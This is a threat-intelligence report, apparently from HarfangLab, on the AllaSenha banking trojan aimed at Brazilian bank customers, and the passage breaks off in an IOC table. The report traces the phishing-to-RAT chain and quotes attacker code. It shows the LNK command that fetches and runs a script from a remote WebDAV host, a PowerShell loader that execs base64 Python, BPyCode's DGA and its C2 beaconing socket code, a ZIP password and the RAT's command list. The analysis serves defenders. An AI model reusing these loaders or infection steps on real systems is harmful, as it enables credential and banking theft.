				media="(max-width: 767.98px)">
														<img srcset="https://harfanglab.io/medias/2024/05/image.png 1x, https://harfanglab.io/medias/2024/05/image.png 2x"
					alt="image"
					width="1456" height="816"
					src="https://harfanglab.io/medias/2024/05/image.png"
					sizes="100vw">
					</picture>
	</figure>
                </div>
            </div>
        </div>
    </div>
</section>


<article class="page-part page-part--single  card--color-purple" style="--illustration-cat: url('https://harfanglab.io/medias/2024/02/Insidethelab-purple.svg'); --color-inside: #7f1fff;">
    <div class="single-wrapper">
        <main class="single-body">
            <div class="container">
                <div class="wrapper">
                    <section class="single-content wysiwyg">
                        <section class="content">
                            <p><em>Identifier: TRR240501.</em></p>
<h2>Summary</h2>
<p>Earlier in May, our security product spotted a malicious payload, which was tentatively delivered to a computer in Brazil, via an intricate infection chain involving Python scripts and a Delphi-developed loader.</p>
<p>The final malicious payload, that we named &#8220;AllaSenha&#8221;, is specifically aimed at stealing credentials that are required to access Brazilian bank accounts, leverages Azure cloud as command and control (C2) infrastructure, and is another custom variant of &#8220;AllaKore&#8221;<sup id="fnref1_allakore"><a class="footnote-ref" href="#fn_allakore">1</a></sup>, an infamous open-source RAT which is frequently leveraged to target users in Latin America.</p>
<p>This report describes the specific infection chain that we encountered, provides associated indicators of compromise (IOCs), and presents the AllaSenha malware.</p>
<h2>Infection chain</h2>
<p>The infection chain that we encountered (see Fig. 1) in May ends with the deployment and execution of AllaSenha. It starts with a phishing email, leading to a malicious Windows shortcut file (LNK), which is disguised as a PDF file and distributed through WebDAV.</p>

<figure id="attachment_104409" class="wp-caption alignnone"><img decoding="async" class="img-fluid full wp-image-104409 size-full" src="https://harfanglab.io/medias/2024/05/fig1-update1.png" alt="Overview of AllaSenha's deployment steps, from infection to delivery" width="5855" height="1820" srcset="https://harfanglab.io/medias/2024/05/fig1-update1.png 5855w, https://harfanglab.io/medias/2024/05/fig1-update1-1080x336.png 1080w, https://harfanglab.io/medias/2024/05/fig1-update1-480x149.png 480w, https://harfanglab.io/medias/2024/05/fig1-update1-960x298.png 960w, https://harfanglab.io/medias/2024/05/fig1-update1-720x224.png 720w, https://harfanglab.io/medias/2024/05/fig1-update1-1440x448.png 1440w, https://harfanglab.io/medias/2024/05/fig1-update1-360x112.png 360w, https://harfanglab.io/medias/2024/05/fig1-update1-240x75.png 240w" sizes="(max-width: 5855px) 100vw, 5855px" /><figcaption class="wp-caption-text"> Figure 1 &#8211; Overview of AllaSenha&#8217;s deployment steps, from infection to delivery</figcaption></figure>

<p>We could also identify likely previous variants of some of the described malicious tools, which were delivered in 2023, abusing public cloud hosting services (such as Autodesk A360 Drive or GitHub) to host malicious payloads. The final payloads were decrypted using the same techniques as the ones that are implemented by BPyCode (see later).</p>
<p>From the various reliable chronological information we could obtain about the malicious LNK and the staging servers they were served from, we believe with medium confidence that the attackers switched to the exact infection chain we describe in this report starting March 2024.</p>
<h3>Infection vector</h3>
<p>Thanks to cooperation, we could precisely identify a phishing email from which the infection chain that we describe started. While we cannot share the full content of this exact email, we retrieved several almost identical samples from late April 2024, leading to the exact same infection chain and phishing website:</p>

<figure id="attachment_104415" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-104415">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/mailexample.png.webp 1226w, https://harfanglab.io/medias/2024/05/mailexample-888x720.png.webp 888w, https://harfanglab.io/medias/2024/05/mailexample-480x389.png.webp 480w, https://harfanglab.io/medias/2024/05/mailexample-960x778.png.webp 960w, https://harfanglab.io/medias/2024/05/mailexample-720x584.png.webp 720w, https://harfanglab.io/medias/2024/05/mailexample-360x292.png.webp 360w, https://harfanglab.io/medias/2024/05/mailexample-1080x876.png.webp 1080w, https://harfanglab.io/medias/2024/05/mailexample-240x195.png.webp 240w" sizes="(max-width: 468px) 100vw, 468px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/mailexample.png" alt="Example of a phishing email starting such infection chain" width="468" height="379" srcset="https://harfanglab.io/medias/2024/05/mailexample.png 1226w, https://harfanglab.io/medias/2024/05/mailexample-888x720.png 888w, https://harfanglab.io/medias/2024/05/mailexample-480x389.png 480w, https://harfanglab.io/medias/2024/05/mailexample-960x778.png 960w, https://harfanglab.io/medias/2024/05/mailexample-720x584.png 720w, https://harfanglab.io/medias/2024/05/mailexample-360x292.png 360w, https://harfanglab.io/medias/2024/05/mailexample-1080x876.png 1080w, https://harfanglab.io/medias/2024/05/mailexample-240x195.png 240w" sizes="(max-width: 468px) 100vw, 468px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 2 &#8211; Example of a phishing email starting such infection chain</figcaption></figure>

<p>The phishing email impersonates a notification for an electronic invoice (&#8220;Nota Fiscal de Serviços Electrônica&#8221;<sup id="fnref1_nfse"><a class="footnote-ref" href="#fn_nfse">11</a></sup> or &#8220;NFS-e&#8221; in Portuguese), which appears to be frequent against targets in Brazil<sup id="fnref1_github_dbat"><a class="footnote-ref" href="#fn_github_dbat">12</a></sup>, as such electronic invoicing process is common, and even mandatory in some circumstances since September 2023. The phishing email samples that we retrieved are all visually very close, but the subject and exact content vary slightly, likely just enough to possibly defeat some elementary content-based spam filters. We identified the following subjects from retrieved email samples: <em>NFS-e Emitida</em>, <em>Segue a NFe gerada</em>, <em>Nota Fiscal gerada</em>, <em>Nota Fiscal</em> <em>&#8211; &lt;an identifier&gt;.</em></p>
<p>Malicious emails contain a link to the <code>is[.]gd</code> link shortener (such as <code>hxxps://is[.]gd/As1idV?0192524.3043</code>), which redirects to a phishing website (see Fig. 3), hosted on a dedicated domain (<code>nfe-digital[.]digital</code>), through a URL matching this pattern: <code>hxxps://notafiscal.nfe-digital[.]digital/nota-estadual/?notafiscal=&lt;an identifier&gt;</code></p>

<figure id="attachment_104423" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-104423">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/phishingexample.png.webp 1676w, https://harfanglab.io/medias/2024/05/phishingexample-1080x564.png.webp 1080w, https://harfanglab.io/medias/2024/05/phishingexample-480x251.png.webp 480w, https://harfanglab.io/medias/2024/05/phishingexample-960x502.png.webp 960w, https://harfanglab.io/medias/2024/05/phishingexample-720x376.png.webp 720w, https://harfanglab.io/medias/2024/05/phishingexample-1440x753.png.webp 1440w, https://harfanglab.io/medias/2024/05/phishingexample-360x188.png.webp 360w, https://harfanglab.io/medias/2024/05/phishingexample-240x125.png.webp 240w" sizes="(max-width: 649px) 100vw, 649px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/phishingexample.png" alt="Example of a phishing website as displayed to the targeted users" width="649" height="339" srcset="https://harfanglab.io/medias/2024/05/phishingexample.png 1676w, https://harfanglab.io/medias/2024/05/phishingexample-1080x564.png 1080w, https://harfanglab.io/medias/2024/05/phishingexample-480x251.png 480w, https://harfanglab.io/medias/2024/05/phishingexample-960x502.png 960w, https://harfanglab.io/medias/2024/05/phishingexample-720x376.png 720w, https://harfanglab.io/medias/2024/05/phishingexample-1440x753.png 1440w, https://harfanglab.io/medias/2024/05/phishingexample-360x188.png 360w, https://harfanglab.io/medias/2024/05/phishingexample-240x125.png 240w" sizes="(max-width: 649px) 100vw, 649px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 3 &#8211; Example of a phishing website as displayed to the targeted users</figcaption></figure>

<p>Phishing webpages include a button which links to a Windows <code>search:</code> protocol<sup id="fnref1_search"><a class="footnote-ref" href="#fn_search">13</a></sup> URL. The latter enables displaying files from a remote WebDAV server in a standard Windows Explorer window (see Fig. 4 in next title): </p>
<pre><code>&lt;a href="search:query=NotaFiscal.pdf&amp;crumb=location:\\191.232.38[.]222@80\Documentos&amp;displayname=Downloads" download=""&gt;
    &lt;img class="pdf-icon" src="Nota%20Fiscal_files/pdf-icon.png" alt="Ícone de PDF" /&gt;
&lt;/a&gt;</code></pre>
<h3>Malicious LNK</h3>
<p><span style="font-size: 1rem;">If a targeted user clicks the button on a phishing page, a standard Windows Explorer window is displayed to the user (see Fig. 4), listing the files that are staged at the remote WebDAV path: a malicious LNK file which is poorly masqueraded as a PDF document (</span><code style="font-size: 1rem;">NotaFiscal.pdf.lnk</code><span style="font-size: 1rem;">, SHA-256 </span><code style="font-size: 1rem;">8424e76c9a4ee7a6d7498c2f6826fcde390616dc65032bebf6b2a6f8fbf4a535</code><span style="font-size: 1rem;">), and a directory (</span><code style="font-size: 1rem;">dc</code><span style="font-size: 1rem;">, which contains BPyCode launcher, a malicious BAT file):</span></p>
<pre><code>\\191.232.38[.]222@80\Documentos\
├── dc/
│   └── c.cmd
└── NotaFiscal.pdf.lnk</code></pre>

<figure id="attachment_103382" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-103382 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/fig2.png.webp 695w, https://harfanglab.io/medias/2024/05/fig2-480x179.png.webp 480w, https://harfanglab.io/medias/2024/05/fig2-360x134.png.webp 360w, https://harfanglab.io/medias/2024/05/fig2-240x89.png.webp 240w" sizes="(max-width: 695px) 100vw, 695px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/fig2.png" alt="Malicious files from the WebDAV server as presented to the targeted user" width="695" height="259" srcset="https://harfanglab.io/medias/2024/05/fig2.png 695w, https://harfanglab.io/medias/2024/05/fig2-480x179.png 480w, https://harfanglab.io/medias/2024/05/fig2-360x134.png 360w, https://harfanglab.io/medias/2024/05/fig2-240x89.png 240w" sizes="(max-width: 695px) 100vw, 695px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 4 &#8211; Malicious files from the WebDAV server as presented to the targeted user</figcaption></figure>

<p>The targeted user, lured into thinking a PDF invoice must be opened, is expected to execute the malicious LNK (<code>NotaFiscal.pdf.lnk</code>). The LNK file in turn runs a Windows command shell, which creates and opens<sup id="fnref1_edgefail"><a class="footnote-ref" href="#fn_edgefail">2</a></sup> a fake invalid PDF file (<code>NotaFiscal.pdf</code>) in the user&#8217;s <code>Downloads</code> folder, then triggers the download and execution of BPyCode launcher (<code>c.cmd</code>):</p>
<pre><code class="language-shell">%windir%\system32\cmd.exe /min /c "echo Indisponivel &gt; %userprofile%downloadsNotaFiscal.pdf 
&amp; start %userprofile%\downloads\NotaFiscal.pdf
&amp; start /min cmd.exe /c "\\191.232.38[.]222@80\Documentos\dc\c.cmd""</code></pre>
<p>We could identify several similar additional WebDAV paths and malicious LNK files, which are all listed in Appendix.</p>
<h3>BPyCode launcher</h3>
<p>The malicious LNK we described downloads and runs a malicious BAT payload (<code>c.cmd</code>, SHA-256 <code>8424e76c9a4ee7a6d7498c2f6826fcde390616dc65032bebf6b2a6f8fbf4a535</code>), that we named &#8220;BPyCode launcher&#8221;, as part of its execution logic.</p>
<p>BPyCode launcher merely launches a base64-encoded PowerShell command. The resulting PowerShell script downloads the Python binary from the official <code>python.org</code> website, and drops it to a created folder<sup id="fnref1_namealg"><a class="footnote-ref" href="#fn_namealg">3</a></sup>, in the <code>C:\Users\Public</code> directory:</p>
<pre><code class="language-powershell">cd $ENV:public
$CP = ($env:COMPUTERNAME -replace "-","") -replace "DESKTOP", ""
$CP2 = -join ($CP[-1..-($CP.length)])
$CP3 = $CP2.ToLower()
$Folder2 = "${ENV:public}\$CP3"
if (!(Test-Path -Path $Folder2 -PathType Container)) {
    Invoke-WebRequest -URI https://www.python.org/ftp/python/3.10.0/python-3.10.0-embed-win32.zip -OutFile "$CP3.zip";
    Expand-Archive "$CP3.zip" -DestinationPath $Folder2;
    Copy-Item -Path "$Folder2\pythonw.exe" -Destination "$Folder2\$CP3.exe"
}
&amp; "$Folder2\$CP3.exe" -c """import base64; exec(base64.b64decode('''''''''&lt;BASE64-ENCODED PYTHON SCRIPT&gt;''')); exit()""";</code></pre>
<p>This PowerShell launcher uses the downloaded and renamed Python interpreter to further execute a base64-encoded Python script, which we named &#8220;BPyCode&#8221;.</p>
<h2>Stage 1 &#8211; BPyCode: a Python DLL downloader and loader</h2>
<p>BPyCode is a Python script that is in charge of downloading a DLL (&#8220;ExecutorLoader&#8221;), and executing it in-memory. The script was decoded from base64 (by the BPyCode launcher script), and never written as a file, so providing a hash to identify the exact BPyCode sample we analysed would not be relevant. However, BPyCode later writes a variant of itself as a file (SHA-256 <code>6149a3d1cff3afe3ebb9ac091844a3b7db7533aa69801c98d00b19cdb8b18c9e</code>) during persistence setup &#8211; we listed all identified BPyCode files hashes in Appendix anyway.</p>
<p>BPyCode uses a domain generation algorithm (DGA) to generate a list of 3 hostnames (of the following pattern: <code>&lt;DGA&gt;.brazilsouth.cloudapp.azure[.]com</code>), as well as a list of 10 TCP ports. BPyCode tries to download a payload from one of the possible combinations of the generated hostnames and ports, and retries with additional combinations until it receives data.</p>
<pre><code class="language-python"># Hostnames generation algorithm from BPyCode
def lk():
    import hashlib
    from datetime import date
    try:
        d = date.today()
        wi = d.weekday()
        di = d.day + wi
        l = 'fghijlmnopqrstuvxzwkyjlmnopqabcghjlabcde'[di]
        r = []
        for _ in range(50, 61, 5):
            t = hashlib.sha1(f"{di*wi*_}{l}{wi}{l}{d.month * di*_}{l}{d.year*di*_}".encode()).hexdigest()*10
            r.append(t[:_].replace(t[:di], l).lower())
        return r
    except:
        return [f'google{di}']</code></pre>
<p>Generated hostnames seem to match those that are associated with the Microsoft Azure Functions<sup id="fnref1_azurefuncs"><a class="footnote-ref" href="#fn_azurefuncs">4</a></sup> service, a serverless infrastructure that in this case would allow operators easily deploy and rotate their staging infrastructure.</p>
<p>The protocol that is used to download from staging servers is raw TCP. Before waiting for server-emitted data, BPyCode sends an identifier (<code>pyCodeV10 - *NEWW*</code>) and some basic information about the targeted computer (host&#8217;s processor name, Windows version and current username):</p>
<pre><code class="language-python">with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as s:
    s.settimeout(30)
    s.connect((f'{choice(lk())}.brazilsouth.cloudapp.azure.com', choice(ptV5())))
    s.send(f'pyCodeV10 - *NEWW* {ss.gethostname()} | {vs} | {pr}'.encode())</code></pre>
<p>The data that BPyCode expects in return is a Pickle<sup id="fnref1_pickle"><a class="footnote-ref" href="#fn_pickle">5</a></sup>-serialized dictionary which contains:</p>
<ul>
	<li>an additional Python loader script to execute;</li>
	<li>a ZIP archive which contains the &#8220;PythonMemoryModule&#8221;<sup id="fnref1_pythonmemorymodule"><a class="footnote-ref" href="#fn_pythonmemorymodule">6</a></sup> Python package, which is aimed at loading a DLL in-memory;</li>
	<li>another ZIP archive which contains ExecutorLoader, a PE library.</li>
</ul>
<p>Both ZIP archives are encrypted (ZipCrypto) with the same password: <code>Snh2301**Snh2301**</code>.</p>
<p>The additional Python loader script that is provided by the server is executed in-memory from BPyCode (via the <code>eval</code> Python function):</p>
<ul>
	<li>it sets BPyCode persistence up, by writing a variant of a BPyCode script under <code>C:\Users\Public\&lt;filename&gt;.txt</code> (where <code>&lt;filename&gt;</code> matches the folder name which is created by the BPyCode launcher<sup id="fnref2_namealg"><a class="footnote-ref" href="#fn_namealg">3</a></sup>), and creating a registry run key at <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\&lt;filename&gt;</code>;</li>
	<li>it decrypts and extracts downloaded ZIP archives in memory;</li>
	<li>it leverages the PythonMemoryModule to dynamically load ExecutorLoader in-memory, then runs its entrypoint (the export named<code>Force</code>).</li>
</ul>
<p>During our analysis, we tried to alter the identifier that is sent from BPyCode to the staging servers (<code>pyCodeXXX...</code>) before downloading further data, and as a result we were able to obtain different payloads, but all match the delivery process that we describe, and ultimately lead to AllaSenha.</p>
<p>We also noted that the password which is used to protect downloaded ZIP archives may be extensively reused by the threat actor, as we were able to decrypt older and publicly available payloads using the same one. Decrypting older payloads also yielded different AllaSenha samples.</p>
<p>A last interesting detail is that BPyCode contains a sort of &#8220;killswitch&#8221; mechanism, as it will stop its execution in case the targeted computer&#8217;s processor name contains <code>Broadwell</code>. Broadwell is an Intel microarchitecture that was discontinued in 2018. The goal of this killswitch is not clear, but we speculate that this condition allows attackers to filter out appliances that are of no interest for the operators (the final payload being dedicated to workstations), or to avoid execution from some sandboxes we could not identify.</p>
<h2>Stage 2 &#8211; ExecutorLoader: a simple Delphi-developed DLL loader</h2>
<table>
<tbody>
<tr>
<td>File name</td>
<td><code>executor.dll</code></td>
</tr>
<tr>
<td>Compilation time</td>
<td>2024-05-02 10:44:22</td>
</tr>
<tr>
<td>Hash (SHA-256)</td>
<td><code>99d0de52a63e5ff790e468dbb8cd0d5273b51ca3b67b5963c0bdedc3a4f44f12</code></td>
</tr>
</tbody>
</table>
<p>ExecutorLoader is a Borland Delphi (10.4) developed DLL which exports a single function called <code>Force</code>. This DLL is downloaded and executed in-memory by BPyCode, and is aimed at further decoding and executing the final payload (in our case, AllaSenha) which is embedded as a resource. To do so, ExecutorLoader injects the payload into a (renamed) <code>mshta.exe</code> instance.</p>
<p>The <code>Force</code> function first copies the system&#8217;s <code>mshta.exe</code> binary to another file using a random name, under a directory chosen in a predefined list:</p>

<figure id="attachment_103385" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-103385 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/fig3.png.webp 543w, https://harfanglab.io/medias/2024/05/fig3-480x444.png.webp 480w, https://harfanglab.io/medias/2024/05/fig3-360x333.png.webp 360w, https://harfanglab.io/medias/2024/05/fig3-240x222.png.webp 240w" sizes="(max-width: 543px) 100vw, 543px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/fig3.png" alt="Random directory selection function" width="543" height="502" srcset="https://harfanglab.io/medias/2024/05/fig3.png 543w, https://harfanglab.io/medias/2024/05/fig3-480x444.png 480w, https://harfanglab.io/medias/2024/05/fig3-360x333.png 360w, https://harfanglab.io/medias/2024/05/fig3-240x222.png 240w" sizes="(max-width: 543px) 100vw, 543px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 5 &#8211; Random directory selection function</figcaption></figure>

<p>ExecutorLoader launches the copied binary using <code>CreateProcessW</code>, then loads one of its own resources (named <code>RcDll</code>) which holds a UPX-packed DLL (SHA-256 <code>65d86160cd4a08d60ada7fcafb7ed9493bf6dacfa098dba27f7851f1bb8de841</code> &#8211; which in our case is AllaSenha). The <code>mshta.exe</code> process is opened, memory is allocated using <code>VirtualAlloc</code> and the loaded resource is copied inside this allocated region:</p>

<figure id="attachment_103388" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-103388 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/fig4.png.webp 1120w, https://harfanglab.io/medias/2024/05/fig4-1080x404.png.webp 1080w, https://harfanglab.io/medias/2024/05/fig4-480x180.png.webp 480w, https://harfanglab.io/medias/2024/05/fig4-960x359.png.webp 960w, https://harfanglab.io/medias/2024/05/fig4-720x269.png.webp 720w, https://harfanglab.io/medias/2024/05/fig4-360x135.png.webp 360w, https://harfanglab.io/medias/2024/05/fig4-240x90.png.webp 240w" sizes="(max-width: 1120px) 100vw, 1120px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/fig4.png" alt="Function injecting the UPX-packed payload in mshta.exe" width="1120" height="419" srcset="https://harfanglab.io/medias/2024/05/fig4.png 1120w, https://harfanglab.io/medias/2024/05/fig4-1080x404.png 1080w, https://harfanglab.io/medias/2024/05/fig4-480x180.png 480w, https://harfanglab.io/medias/2024/05/fig4-960x359.png 960w, https://harfanglab.io/medias/2024/05/fig4-720x269.png 720w, https://harfanglab.io/medias/2024/05/fig4-360x135.png 360w, https://harfanglab.io/medias/2024/05/fig4-240x90.png 240w" sizes="(max-width: 1120px) 100vw, 1120px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 6 &#8211; Function injecting the UPX-packed payload in mshta.exe</figcaption></figure>

<p>A thread is then created inside the remote <code>mshta.exe</code> process, to run the final payload (AllaSenha).</p>
<p>We could identify some older versions of ExecutorLoader, distributed as an executable binary, called <code>Execute_dll.exe</code> (and usually stored in a ZIP file called <code>Execute_dll.zip</code>, which would be encrypted using the same password as the one used by BPyCode). The code of this executable is exactly the same as the described DLL version, except of course for the entrypoint. This executable version has notably been hosted on GitHub at <code>https://raw.githubusercontent[.]com/marinabarros320168/new/main/Execute_dll.exe</code>.</p>
<h2>AllaSenha, an AllaKore RAT variant</h2>
<table>
<tbody>
<tr>
<td>File name</td>
<td>N/A</td>
</tr>
<tr>
<td>Compilation time</td>
<td>2024-05-02 10:44:07</td>
</tr>
<tr>
<td>Hash (SHA-256)</td>
<td><code>65d86160cd4a08d60ada7fcafb7ed9493bf6dacfa098dba27f7851f1bb8de841</code></td>
</tr>
</tbody>
</table>
<p>The final payload which is deployed from ExecutorLoader is a banking trojan that we named &#8220;AllaSenha&#8221;, and which is comprised of a single Windows 32bits UPX-packed DLL (once unpacked using UPX 4.2.2, its SHA-256 is <code>ac4b4b6cfe4d4e8710384246c008764cdb7547a6c3081e72687fefdf0614c7a5</code>).</p>
<p>AllaSenha targets Brazil&#8217;s main banks, such as Sicredi, Itaú Unibanco, Caixa, Banco Brazil, or Sicoob and aims at stealing passwords, 2-factor authentication (2FA) tokens and QR codes.</p>
<p>AllaSenha leverages Azure cloud as C2 infrastructure. It implement a DGA (in functions called <code>GeraHost</code> and <code>GeraPorta</code> &#8211; &#8220;Generate Host&#8221; and &#8220;Generate Port&#8221; in Portuguese), which generates a C2 hostname in the <code>.brazilsouth.cloudapp.azure[.]com</code> domain, as well as a port to connect to. AllaSenha DGA is different than the one in BPyCode, is based on the execution date, and may vary depending on the bank for which credentials are exfiltrated (one DGA modifier applies to Banco do Brasil only, another to Itaú Unibanco only). A reproduction of AllaSenha DGA is provided in Appendix &#8211; as an example, <code>nhefxgbdedndzhebcfedufbgkfecgbccfecgbcc.brazilsouth.cloudapp.azure[.]com</code> is a C2 hostname which has been generated on 2024-05-27.</p>
<p>Just like BPyCode, C2 communications between the malware and the server use raw ASCII text over a TCP socket. To handle part of these communications, AllaSenha appears to include a Delphi open-source library called ServerSocket<sup id="fnref1_serversocket"><a class="footnote-ref" href="#fn_serversocket">7</a></sup>, allowing basic RAT functionalities such as keyboard and mouse control, as well remote desktop capabilities. Interestingly, while AllaKore<sup id="fnref2_allakore"><a class="footnote-ref" href="#fn_allakore">1</a></sup> and ServerSocket do not seem to be directly related, both projects use the same name pattern for C2 commands (<code>&lt;|COMMAND|&gt;</code>), which may indicate that they are either often used in conjunction or inspired after one another.</p>
<p>All AllaSenha samples that we retrieved use <code>Access_PC_Client_dll.dll</code> as their original file name. This name can notably be found in the KL Gorki<sup id="fnref1_gorki"><a class="footnote-ref" href="#fn_gorki">8</a></sup> project, a banking malware which seems to combine components of both AllaKore and ServerSocket. As a result, we believe with medium to high confidence that AllaSenha is initially based on the KL Gorki source code in particular.</p>
<p>The list of commands found in AllaSenha offer a glimpse of malware&#8217;s capabitities:</p>
<pre><code>&lt;|ASS-BLUE-PJ|&gt;
&lt;|ASS-BLUE|&gt;
&lt;|ASS-SANTA|&gt;
&lt;|BB-AMARELO|&gt;
&lt;|BB-AZUL|&gt;
&lt;|BB-PASS6|&gt;
&lt;|BB-PASS8|&gt;
&lt;|BB-PROCURADOR|&gt;
&lt;|BLOQUEAR|&gt;
&lt;|CLOSEKEYBOARD|&gt;
&lt;|DESCO-TKAPP|&gt;
&lt;|DESCO-TKCHAVEIRO|&gt;
&lt;|FECHAR-ANYDESK|&gt;
&lt;|ITAU-SNH-CARTAO|&gt;
&lt;|ITAU-SNH-ENTRADA|&gt;
&lt;|ITAU-TK-APP|&gt;
&lt;|ITAU-TK-CHAVEIRO|&gt;
&lt;|ITAU-TK-SMS|&gt;
&lt;|LIMPAR-TECLAS|&gt;
&lt;|PRINCIPAL|&gt;
&lt;|PUXAR-TECLAS|&gt;
&lt;|QR-CONFIRMADO|&gt;
&lt;|REQUESTKEYBOARD|&gt;
&lt;|SAFRA-DADOS|&gt;
&lt;|SENHA|&gt;Ass: 
&lt;|SICOOB-HEIGTH|&gt;
&lt;|SICREDI-TOKEN-CELULAR|&gt;
&lt;|SICREDI-TOKEN-CHAVEIRO|&gt;
&lt;|START-CAPTURA|&gt;
&lt;|STN-6DG|&gt;
&lt;|STOP-CAPTURA|&gt;
&lt;|TAMANHO|&gt;
&lt;|UNICRED-ASS|&gt;
&lt;|UNICRED-TKN|&gt;</code></pre>
<p>Upon launch, AllaSenha reads the user&#8217;s browser data to search for credentials associated with targeted banks. If AllaSenha is unable to find any, it enters a &#8220;waiting&#8221; state in which it starts multiple threads to check if the user is performing actions associated with banking. Actions that can get AllaSenha to leave its waiting state include Internet browsing to a targeted banking website, the usage of the <code>itauaplicativo.exe</code> (from Itaú Unibanco) desktop application, or the saving of passwords associated with targeted banks in the browser password database. AllaSenha does not communicate with C2 servers if it has not found data of interest.</p>
<p>To deal with 2FA, which is enabled on most banking websites, AllaSenha has the ability to display dedicated hijacking windows requiring the targeted users to proceed with a second factor. Using the <code>&lt;|TRAVAR|&gt;</code> command, operators can freeze user&#8217;s desktop with a fake bank security plugin load screen:</p>

<figure id="attachment_103391" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-103391 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/fig5.png.webp 975w, https://harfanglab.io/medias/2024/05/fig5-480x304.png.webp 480w, https://harfanglab.io/medias/2024/05/fig5-960x608.png.webp 960w, https://harfanglab.io/medias/2024/05/fig5-720x456.png.webp 720w, https://harfanglab.io/medias/2024/05/fig5-360x228.png.webp 360w, https://harfanglab.io/medias/2024/05/fig5-240x152.png.webp 240w" sizes="(max-width: 975px) 100vw, 975px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/fig5.png" alt="AllaSenha fake security plugin load screen" width="975" height="618" srcset="https://harfanglab.io/medias/2024/05/fig5.png 975w, https://harfanglab.io/medias/2024/05/fig5-480x304.png 480w, https://harfanglab.io/medias/2024/05/fig5-960x608.png 960w, https://harfanglab.io/medias/2024/05/fig5-720x456.png 720w, https://harfanglab.io/medias/2024/05/fig5-360x228.png 360w, https://harfanglab.io/medias/2024/05/fig5-240x152.png 240w" sizes="(max-width: 975px) 100vw, 975px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 7 &#8211; AllaSenha fake security plugin load screen</figcaption></figure>

<p>We believe this screen exists to give operators some time to interact with AllaSenha while trying to use stolen credentials for transactions. Operators can then issue AllaSenha commands to display 2FA validation windows on targeted user&#8217;s desktop, depending on the bank they are trying to connect to. For instance, operators can require a targeted user to validate an operator-initiated transaction by scanning a QR code, and entering a confirmation secret which would be provided by the Brasdesco mobile application (the QR code has been redacted in the following capture):</p>

<figure id="attachment_103394" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-103394 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/05/fig6.png.webp 949w, https://harfanglab.io/medias/2024/05/fig6-480x289.png.webp 480w, https://harfanglab.io/medias/2024/05/fig6-720x434.png.webp 720w, https://harfanglab.io/medias/2024/05/fig6-360x217.png.webp 360w, https://harfanglab.io/medias/2024/05/fig6-240x145.png.webp 240w" sizes="(max-width: 949px) 100vw, 949px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/05/fig6.png" alt="AllaSenha QR code-based hijacking window" width="949" height="572" srcset="https://harfanglab.io/medias/2024/05/fig6.png 949w, https://harfanglab.io/medias/2024/05/fig6-480x289.png 480w, https://harfanglab.io/medias/2024/05/fig6-720x434.png 720w, https://harfanglab.io/medias/2024/05/fig6-360x217.png 360w, https://harfanglab.io/medias/2024/05/fig6-240x145.png 240w" sizes="(max-width: 949px) 100vw, 949px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 8 &#8211; AllaSenha QR code-based hijacking window</figcaption></figure>

<p>Multiple 2FA windows are available for operators to hijack tokens of different types, such as in-app tokens, SMS tokens and QR codes.</p>
<h2>Infrastructure</h2>
<p>The threat actor most notably leverages the gd[.]is link shortener and dedicated domains as part of its phishing infrastructure, as well as Azure cloud infrastructure as payload stagers and C2 servers.</p>
<h3>Phishing websites</h3>
<p>Links in phishing emails leverage the <code>is[.]gd</code> link shortener to redirect to dedicated phishing domains. The malicious email samples that we retrieved all ultimately lead to phishing URLs on those 2 hostnames: <code>notafiscal.nfe-digital[.]digital</code>, <code>nota-fiscal.nfe-digital[.]top</code>.</p>
<p>Hostnames resolves to Cloudflare IPs, but original content is likely hosted at HostGator Brazil<sup id="fnref1_hostgator"><a class="footnote-ref" href="#fn_hostgator">14</a></sup>, as can be guessed from HTTP error pages that are displayed by phishing websites in case of an invalid URL. Associated domains were both registered on the 2024-04-26 at Go Daddy, and set to use Cloudflare name servers.</p>
<p>Pivoting from the described characteristics, we identified 2 additional and similar domains that were registered on the 2024-04-25, and that we believe with medium confidence have been (or could be) used as part of a phishing infrastructure: <code>nfe-digital[.]online</code>, <code>nfe-digital[.]site</code>.</p>
<h3>Stagers</h3>
<p>The WebDAV server which delivered the malicious LNK in the case that we described (<code>191.232.38[.]222@80</code>) had been setup the day before, and taken down the day after. This server only had a single HTTP server running on port 80, with a default Apache 2 index page. On this server, whose IP belongs to Microsoft (ASN 8075) and which is located in Brazil, a <code>/Documentos</code> directory containing a malicious LNK and a BPyCode launcher was staged.</p>
<p>We identified several other WebDAV paths matching Microsoft IPs in Brazil, which hosted both a <code>NotaFiscal.pdf.lnk</code> malicious LNK file (all samples that we retrieved triggered the same actions than we described) and a malicious BAT downloader:</p>
<table>
<thead>
<tr>
<th>WebDAV path</th>
<th>Hosted Malicious LNK (SHA-256)</th>
<th>Hosted BPyCode launcher</th>
<th>Date of last WebDAV content modification</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\\191.239.123[.]241@80\Documentos\</code></td>
<td><code>46e754727efdc2c891319d25a67ee999a4d8a0b21b0113db08eead42cf51b780</code></td>
